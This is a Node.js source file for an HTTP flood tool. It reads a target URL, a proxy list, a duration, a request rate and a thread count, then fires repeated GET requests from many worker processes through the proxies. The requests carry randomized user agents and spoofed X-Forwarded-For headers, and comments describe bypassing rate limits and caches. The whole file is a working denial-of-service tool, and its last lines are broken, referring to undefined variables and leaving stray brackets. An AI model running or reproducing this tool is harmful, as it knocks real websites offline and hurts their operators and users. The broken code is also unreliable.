const request = require('request');
const fs = require('fs');
const UserAgent = require('user-agents');
const URL = require('url');
const cluster = require('cluster');
const os = require('os');
const net = require('net');

var args = {
  url: process.argv[2],                     // url
  host: URL.parse(process.argv[2]).host,    // host
  proxy: process.argv[3],                   // proxy file
  mode: process.argv[4],                    // mode (http/socket)
  time: parseInt(process.argv[5]),          // boot time
  rps: 1000/parseInt(process.argv[6]),      // rps (bypass ratelimit)
  cache: process.argv[7],                   // bypass cache with random get True/False
  threads: parseInt(process.argv[8]),       // number of threads for cluster
};

const usage = "usage: <url> <proxy_file> <mode (http/socket)> <time> <rps> <cache bypass (True/False)> <threads>";
if (process.argv.length < 9) return console.log(usage);

function randomByte() {
  return Math.round(Math.random() * 256);
}

function randomIp() {
  const ip = `${randomByte()}.${randomByte()}.${randomByte()}.${randomByte()}`;

  return isPrivate(ip) ? ip : randomIp();
}

function isPrivate(ip) {
  return /^(10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[0-1]))/.test(ip);
}

var ips_spoofed = [];
for (let i = 0; i < 200; i++) {
  ips_spoofed.push(randomIp());
}

function get_fake_ips() {
  let xforwarded = "";
  for (let i = 0; i < (6 ? Math.round(Math.random() * (6 - 4)) + 6 : Math.round(Math.random() * 4)); i++) {
    xforwarded += ips_spoofed[Math.floor(Math.random() * ips_spoofed.length)] + ", ";
  }
  return xforwarded.slice(0, -2);
}

function getUA() {
  return new UserAgent().toString();
}

function socket_generate_payload(args, ua) {
  let headers = "";
  headers += 'GET ' + args.url + ' HTTP/1.1' + '\r\n';
  headers += 'Host: ' + args.host + '\r\n';
  headers += 'Connection: keep-alive' + '\r\n';
  headers += 'Dnt: 1' + '\r\n';
  headers += 'User-Agent: ' + ua + '\r\n';
  headers += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' + '\r\n';
  headers += 'Accept-Language: en-US,en;q=0.9' + '\r\n';
  headers += 'Accept-Encoding: gzip, deflate, br' + '\r\n';
  headers += 'Pragma: no-cache' + '\r\n';
  headers += 'Cache-Control: max-age=0' + '\r\n';
  headers += 'Upgrade-Insecure-Requests: 1' + '\r\n';
  headers += 'X-Real-IP: ' + get_fake_ips() + '\r\n';
  headers += 'X-Forwarded-For: ' + get_fake_ips() + '\r\n';
  headers += '\r\n';

  return headers;
}

function socket_flood(args, proxy, ua) {
  setInterval(() => {
    let payload = socket_generate_payload(args, ua);
    try {
      let socket = net.connect(proxy.split(':')[1], proxy.split(':')[0]);

      socket.setKeepAlive(true, 50000);
      socket.setTimeout(50000);
      socket.once('error', err => {});
      socket.once('disconnect', () => {});
      socket.once('data', () => {});

      for (let j = 0; j < 40; j++) {
        socket.write(payload);
      }

      socket.on('data', () => {
        setTimeout(() => {
          socket.destroy();
        }, 5000);
      });
    } catch (e) {}
  });
}

function start(args) {
  if (cluster.isMaster) {
    const numCPUs = Math.min(os.cpus().length, args.threads);
    console.log(`Starting ${args.mode} flood on ${args.url} for ${args.time} second(s) with ${numCPUs} worker(s)`);

    for (let i = 0; i < numCPUs; i++) {
      cluster.fork();
    }

    setTimeout(() => {
      for (const id in cluster.workers) {
        cluster.workers[id].kill();
      }
      process.exit(4);
    }, args.time * 1000);
  } else {
    proxies = fs.readFileSync(args.proxy, 'utf-8').toString().replace(/\r/g, '').split('\n');
    let ua = getUA();
    for (let i = 0; i < proxies.length; i++) {
      let proxy = proxies[i];
      start_flood(args, proxy, ua);
    }
  }
}

function start_flood(args, proxy, ua) {
  if (args.mode === "socket") {
    socket_flood(args, proxy, ua);
  }
}

start(args);

setTimeout(()=>clearInterval(intv),time*1000)
})
